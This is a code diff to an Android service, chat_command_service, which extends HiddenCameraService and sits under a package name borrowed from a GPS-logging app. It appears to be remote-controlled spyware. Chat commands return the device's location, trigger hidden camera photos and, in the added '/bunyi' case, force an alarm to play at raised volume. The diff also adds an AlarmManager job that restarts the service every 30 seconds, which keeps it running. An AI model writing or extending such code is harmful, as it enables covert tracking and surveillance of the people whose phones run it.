@@ -2,7 +2,9 @@ package com.mendhak.gpslogger.darisms;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.app.AlarmManager;
 import android.app.Notification;
+import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
@@ -10,15 +12,20 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.media.AudioManager;
+import android.media.Ringtone;
+import android.media.RingtoneManager;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
+import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
@@ -382,8 +389,8 @@ public class chat_command_service extends HiddenCameraService {
             case "/lokasi":
                 final SharedPreferences sharedSimpanNotif = context.getSharedPreferences("notif", MODE_PRIVATE);
 
-                String latlong = sharedSimpanNotif.getString("latlong","");
-                String isi = sharedSimpanNotif.getString("isi","");
+                String latlong = sharedSimpanNotif.getString("maps_latlong","");
+                String isi = sharedSimpanNotif.getString("ischarging","");
 
                 request_body.text = latlong+" \n "+isi;
                 has_command = true;
@@ -561,6 +568,21 @@ public class chat_command_service extends HiddenCameraService {
                 has_command = true;
                 break;
 
+            case "/bunyi":
+                try {
+                    AudioManager manager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
+                    manager.setStreamVolume(AudioManager.STREAM_MUSIC, 100, 0);
+
+                    Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
+                    Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), notification);
+                    r.play();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+
+                request_body.text = "Processing "+command;
+                has_command = true;
+                break;
 
             case "/fotobelakangmedium":
 
@@ -826,6 +848,18 @@ public class chat_command_service extends HiddenCameraService {
         intentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
         broadcast_receiver = new broadcast_receiver();
         registerReceiver(broadcast_receiver, intentFilter);
+
+
+
+
+        /*gila*/
+        final Intent intent = new Intent(context, chat_command_service.class);
+        final PendingIntent pending = PendingIntent.getService(context, 0, intent, 0);
+        final AlarmManager alarm = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+        alarm.cancel(pending);
+        long interval = 30000;//milliseconds
+        alarm.setRepeating(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime(),interval, pending);
+
     }
 
     private boolean get_me() {
